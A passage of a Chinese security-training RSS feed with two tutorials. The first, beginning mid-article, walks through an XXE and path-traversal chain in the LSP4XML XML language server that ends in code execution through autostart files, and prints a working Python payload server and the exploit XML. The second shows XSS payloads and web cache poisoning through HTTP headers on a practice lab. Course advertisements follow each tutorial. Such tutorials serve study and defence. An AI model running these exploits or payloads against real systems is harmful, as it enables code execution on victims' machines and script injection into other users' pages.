文档的支持，它基于使用 Java 运行的 LSP4XML 语言服务器。&lt;/blockquote&gt;&lt;p&gt;第一想到的就是禁用它，然后再进行后面的实验步骤。&lt;/p&gt;&lt;p&gt;VSCode-XML 使你可以打开 XML / DTD / XSTL / XSD 文件并解析它们的语法错误，重点是根据 DTD / XSD 定义验证 XML / XSTL 文件。&lt;/p&gt;&lt;p&gt;可知 XXE 漏洞本身在于 LSP4XML：在安装了 VSCode-XML 的 VS Code 中打开 XML 文件编辑或保存时，LSP4XML 在本地解析文件并在 VS Code 界面中报错。&lt;/p&gt;&lt;p&gt;&lt;b&gt;以此构造一个恶意文件，当安装了 VSCode-XML 的 VS Code 的目标打开该 XML 文件时，实现一系列利用操作。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;尝试了在这种情况下使用的常见渗透方法，但是由于最近的 Java 版本（1.8+）和 URL 解析的结合，所有操作都失败了。&lt;/p&gt;&lt;p&gt;可以执行的只有：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;盲 SSRF&lt;/li&gt;&lt;li&gt;Windows 上的 NetNTLMv2 渗透&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;实验&lt;/h2&gt;&lt;p&gt;在玩 XXE 时，发现一种奇怪的的行为：url 仅搜索一次，再次进行操作就不会去搜索。应该是存在某种缓存机制，将 DTD 的文件下载并存储在某个地方。&lt;/p&gt;&lt;p&gt;&lt;b&gt;缓存机制：&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;解析 XML 文件&lt;/li&gt;&lt;li&gt;如果引用了外部实体，则注明其 URL&lt;/li&gt;&lt;li&gt;通过检查目录 $HOME/.lsp4xml/cache/http/$host/$path_of_file，使用指定的 URL 验证来自同一主机的文件是否已被缓存&lt;/li&gt;&lt;li&gt;如果缓存条目不存在，则文件被下载并移至$HOME/.lsp4xml/cache/http/$host/$path_of_file&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;那么问题来了，路径能不能被控制？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果外部实体 URL 路径中包含 ../ 会发生什么？&lt;/p&gt;&lt;p&gt;经实验，缓存过程在保存缓存文件时会受到路径遍历的影响，从而可以在任意本地目录中写入任意远程文件。如果尚未创建所需的文件夹结构，此过程也能实现。&lt;/p&gt;&lt;h2&gt;从 XXE 到 RCE&lt;/h2&gt;&lt;p&gt;漏洞存在的原因是在缓存的最后一步，如果缓存条目不存在，则文件被下载并移至对应的目录，其中参数 $path_of_file 可被控制，比如外部实体的 URL 为：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http://attack.er/../../../../Desktop/test.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;缓存文件将被写入 $HOME/Desktop/test.txt，从而导致任意文件写入。&lt;/p&gt;&lt;p&gt;唯一的限制就是缓存机制的第 3 点，因此无法覆盖任何文件，并且所有操作都是使用当前用户权限完成的（因此，如果当前用户是管理员，我们可以在任何地方写，否则只能在其主目录可写）。&lt;/p&gt;&lt;p&gt;可以通过滥用启动/自动启动机制来轻松实现RCE：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;在 Windows 系统上，通过将批处理文件引用为外部实体并使用遍历路径将其写入 $HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ 文件夹中。&lt;/li&gt;&lt;li&gt;在大多数 GNU/Linux 系统上，通过在 $HOME/.config/autostart/ 文件夹中编写一个“desktop”文件。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;只需要等待受害者注销并再次在其计算机上登录以获得执行的代码即可。&lt;/p&gt;&lt;h2&gt;影响&lt;/h2&gt;&lt;p&gt;在完成 LSP4XML 的利用链之后，除 VSCode-XML 之外，还发现 Eclipse 的 wildwebdeveloper 扩展和 theia-xml-extension 也在使用该库，因此都容易受到攻击。&lt;/p&gt;&lt;h2&gt;实践&lt;/h2&gt;&lt;p&gt;以下是在 Windows 和 GNU/Linux 系统上利用 XXE 并实现 RCE 的步骤：&lt;/p&gt;&lt;p&gt;首先，安装 VS Code 和 vscode-xml 扩展&amp;lt;0.9.1版本（注意：目前最新为 0.10.1）。&lt;/p&gt;&lt;p&gt;创建 server.py（Python3）并运行&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
 
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header(&amp;#39;Content-type&amp;#39;, &amp;#39;application/octet-stream&amp;#39;)
        self.end_headers()
        if &amp;#39;.desktop&amp;#39; in self.path:
            self.wfile.write(b&amp;#39;[Desktop Entry]\nName=Exploit\nGenericName=\nComment=\nExec=sh -c &amp;#34;id;read&amp;#34;\nTerminal=true\nType=Application\nX-GNOME-Autostart-enabled=true&amp;#39;)	
        else:
            self.wfile.write(b&amp;#39;start cmd.exe /k &amp;#34;whoami&amp;#34;&amp;#39;)
        
def run(server_class=HTTPServer, handler_class=RequestHandler, port=9000):
    server_address = (&amp;#39;&amp;#39;, port)
    httpd = server_class(server_address, handler_class)
    print(&amp;#39;Starting httpd on port {}...&amp;#39;.format(port))
    httpd.serve_forever()
 
run()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 VS code 中新建文件并输入：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
&amp;lt;!DOCTYPE r [ 
    &amp;lt;!ENTITY linux SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../.config/autostart/cmd.desktop&amp;#34;&amp;gt;
    &amp;lt;!ENTITY windows SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cmd.bat&amp;#34;&amp;gt; 
]&amp;gt;
&amp;lt;r&amp;gt;&amp;amp;linux;&amp;amp;windows;&amp;lt;/r&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后保存该 XML 文件。&lt;/p&gt;&lt;p&gt;观察对 Python3 Web 服务器的请求，当用户执行注销或登录，将执行注入命令（在 Windows 上打开“命令提示符”并执行 whoami 命令，在 GNU/Linux 上打开终端并执行 id 命令）&lt;/p&gt;&lt;p&gt;具体操作：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/wp-content/uploads/2019/10/Video-xxe-3.gif&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/wp-con&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;tent/uploads/2019/10/Video-xxe-3.gif&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;h2&gt;防范&lt;/h2&gt;&lt;p&gt;及时更新插件 VS Code-XML 的版本。&lt;/p&gt;&lt;p&gt;源自：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/dont-open-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/dont-o&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;pen-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-18-103044773</guid>
<pubDate>Sat, 18 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>在HTTP头中进行XSS</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-17-103224416.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103224416&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8d9bc030ff73aa70931523b798ba619d_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;说到 XSS 相信大家肯定都不陌生（都 2020 年了，还在讲 XSS 这种老掉牙的东西），有些人甚至看到输入框就想往里面输 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; ，今天我们就来学习 &lt;b&gt;怎样在 HTTP 头中进行 XSS ？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;直奔主题，先几个 XSS 的经典案例：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&amp;lt;form action=&amp;#34;/xss.php/&amp;#34;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&lt;/li&gt;&lt;li&gt;&amp;lt;p&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;lt;/p&amp;gt;&lt;/li&gt;&lt;li&gt;&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;a&amp;#34; value=&amp;#34;&amp;#34;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;#34;&amp;gt;&lt;/li&gt;&lt;li&gt;&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;a&amp;#34; value=&amp;#34;&amp;#34;&amp;amp;gt;&amp;gt;&amp;lt;svg onload=alert(1)&amp;amp;gt;&amp;#34;&amp;gt;&lt;/li&gt;&lt;li&gt;var test = &amp;#39;&amp;lt;/script&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;#39;;&lt;/li&gt;&lt;li&gt;...&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;当然，远不止这些，枚不胜举。&lt;/p&gt;&lt;p&gt;其他关于 XSS 的知识就不多讲了，毕竟是老生常谈的东西，下面就来讲讲不一般的 XSS。&lt;/p&gt;&lt;h2&gt;HTTP头中的XSS&lt;/h2&gt;&lt;p&gt;开门见山，在某些情况下，没有清除应用程序 HTTP 头中传递的信息，并将其输出到请求页面的某个位置时，导致的 XSS 情况。&lt;/p&gt;&lt;p&gt;&lt;b&gt;一种情况&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我们可以控制 HTTP 头中的某些信息存储在数据库中，然后在同一页面中，应用程序中的其他任何地方甚至在另一个不可访问的系统中检索到。但是，由于 CDN 和 WAF 的存在，还存在另一种非常普遍的情况，无需进行数据库操作即可持续进行攻击：&lt;b&gt;Web 缓存中毒&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;实践&lt;/h2&gt;&lt;p&gt;练习地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//brutelogic.com.br/lab/header.php&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;brutelogic.com.br/lab/h&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;eader.php&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1244&quot; data-rawheight=&quot;288&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1244&quot; data-original=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1244&quot; data-rawheight=&quot;288&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1244&quot; data-original=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?=json_encode(getallheaders()).&amp;#34;\n&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在命令行中执行命令 curl -i，它向我们显示了响应的 HTTP 标头以及 JSON 格式的请求头。&lt;/p&gt;&lt;blockquote&gt;curl 是一种命令行工具，作用是发出网络请求，然后获取数据，显示在&amp;#34;标准输出&amp;#34;（stdout）上面，它支持多种协议。&lt;br/&gt;-i 参数可以显示 http response 的头信息，连同网页代码一起。&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;808&quot; data-rawheight=&quot;291&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;808&quot; data-original=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;808&quot; data-rawheight=&quot;291&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;808&quot; data-original=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;由于实验靶场的 WAF 提供了最后一个标头 x-sucuri-cache，因此我们需要在 URL 中添加一些内容来避免缓存，该标头的值为 HIT，意思就是它来着 WAF 的缓存。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;808&quot; data-rawheight=&quot;291&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;808&quot; data-original=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;808&quot; data-rawheight=&quot;291&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;808&quot; data-original=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;因此，访问带参数“lololol”的页面，我们能够得到页面的非缓存版本，标头 x-sucuri-cache 的标头值变成了 MISS 。再注入自己的标头（使用参数 -H），以检查它是否以响应的形式出现。&lt;/p&gt;&lt;blockquote&gt;-H --header 在 http request 之中，自行增加一个头信息。&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;309&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;826&quot; data-original=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;309&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;826&quot; data-original=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;响应成功，得到带有 Test：myValue 的响应。再更改字符串为“kkkkk”发出另一个请求，不然将返回带有“ lololol”字符串的缓存响应。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;826&quot; data-original=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;826&quot; data-original=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;再使用“kkkkk”作为字符串来再次开始缓存处理。如上图所示，还带入了 XSS payload。但仅是对自己有用，因为只是本机终端发送该标头。payload 不会出现在其他的浏览器请求中。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;826&quot; data-original=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;826&quot; data-original=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;发另一个请求（注意看 data 时间不同），貌似没有什么区别。这是因为缓存机制是基于 MISS-MISS-HIT，因此下一个为 MISS。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;826&quot; data-original=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;826&quot; data-original=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;验证是否已经缓存，打开目标 URL&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;https://brutelogic.com.br/lab/header.php?kkkkk&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;912&quot; data-rawheight=&quot;273&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;912&quot; data-original=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;912&quot; data-rawheight=&quot;273&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;912&quot; data-original=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;该 URL 将保持中毒状态，直到缓存过期，这就是缓存投毒。&lt;/p&gt;&lt;p&gt;练习地址2：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//brutelogic.com.br/lab/welcome.php&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;brutelogic.com.br/lab/w&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;elcome.php&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;工作原理跟上面一样，不过没有了那么明显的输出点，执行 XSS 需要先找到输出点。页面的源代码如下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;?php
$name = $_COOKIE[&amp;#34;name&amp;#34;];
if($name){
    echo &amp;#34;&amp;lt;p&amp;gt;Welcome, $name!&amp;lt;/p&amp;gt;\n&amp;#34;;
}else{
    echo &amp;#34;&amp;lt;p&amp;gt;Welcome, guest!&amp;lt;/p&amp;gt;\n&amp;#34;;
}
?&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;尝试进行 XSS 吧，完成的同学，评论区欢迎:)&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;来源：&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//brutelogic.com.br/blog/xss-via-http-headers/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;brutelogic.com.br/blog/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;xss-via-http-headers/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a 